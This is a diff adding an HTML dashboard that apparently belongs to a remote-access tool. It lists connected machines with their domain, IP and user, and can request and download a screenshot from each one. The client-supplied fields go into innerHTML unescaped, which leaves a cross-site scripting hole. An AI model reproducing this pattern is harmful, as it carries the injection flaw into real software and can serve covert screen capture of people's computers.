@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Client Info</title>
+    <script>
+        async function fetchClients() {
+            const response = await fetch('/clients');
+            const clients = await response.json();
+
+            const tableBody = document.getElementById('clients-table-body');
+            tableBody.innerHTML = '';
+
+            clients.forEach(client => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${client.Domain}</td>
+                    <td>${client.Machine}</td>
+                    <td>${client.IP}</td>
+                    <td>${client.User}</td>
+                    <td>${client.LastActivity}</td>
+                    <td><button onclick="requestScreenshot('${client.id}')">Screenshot</button></td>
+                `;
+                tableBody.appendChild(row);
+            });
+        }
+
+        async function requestScreenshot(clientId) {
+            try {
+                const response = await fetch(`/screenshot/${clientId}`, { method: 'POST' });
+                if (response.ok) {
+                    console.log(`Screenshot request sent to ${clientId}`);
+
+                    setTimeout(() => {
+                        window.location.href = `/download/screen.png`;
+                    }, 2000);
+                } else {
+                    console.error(`Failed to request screenshot for ${clientId}`);
+                }
+            } catch (error) {
+                console.error(`Error sending screenshot request: ${error}`);
+            }
+        }
+
+        setInterval(fetchClients, 5000);
+        window.onload = fetchClients;
+    </script>
+</head>
+<body>
+    <h1>Client Information</h1>
+    <table border="1">
+        <thead>
+            <tr>
+                <th>Domain</th>
+                <th>Machine</th>
+                <th>IP</th>
+                <th>User</th>
+                <th>Last Activity</th>
+                <th>Action</th>
+            </tr>
+        </thead>
+        <tbody id="clients-table-body">
+        </tbody>
+    </table>
+</body>
+</html>
